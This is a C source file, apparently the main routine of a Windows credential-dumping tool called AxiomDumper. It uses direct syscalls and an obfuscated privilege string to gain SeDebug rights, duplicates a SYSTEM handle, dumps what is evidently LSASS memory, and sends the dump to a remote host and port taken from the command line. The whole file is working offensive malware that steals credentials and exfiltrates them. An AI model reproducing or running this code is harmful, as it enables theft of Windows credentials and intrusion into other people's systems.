#include <stdio.h>

#include "AxiomDumper.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char **argv)
{
    LUID luid = { 0,0 };
    void* buffer;
    int bufferSize = 0;
    BOOL success = false;

	AXIOM_Prepare_Syscalls();
    if (AXIOM_PrivCheck())
    {
        HANDLE duplicatedHandle = NULL;

        LookupPrivilegeValueW(NULL, SecretWStrBuilder(STRBUILDER_SEDEBUG), &luid);
        printf("SeDeb identified\n");
        AXIOM_PrivIncrease(luid);
        printf("Got high privs\n");

        AXIOM_DuplicatePrivilegedToken(luid);
        printf("Token duplicated\n");
        duplicatedHandle = AXIOM_HDuplicate();
        printf("Handle duplicated\n");
        Sleep(2000);
        if (duplicatedHandle == NULL)
        {
            printf("[!] Could not duplicate a SYSTEM handle with ALL_ACCESS, process has probably the RunAsPPL flag on\n");
            return (FALSE);
        }
        success = El_Sass(duplicatedHandle, (const void**)&buffer, &bufferSize);
        if (!success) {
            printf("[!] Failed\n");
        }
        printf("Memory dumped, got %d bytes\n", bufferSize);
        Sleep(500);
        printf("Sleep complete\n");

        AXIOM_NetworkEmitter(argv[1], drunk_atoi(argv[2]), (unsigned char *)buffer, bufferSize);
    }
    else {
        printf("[!] Not enough privileges\n");
        return (FALSE);
    }

    return (TRUE);
}
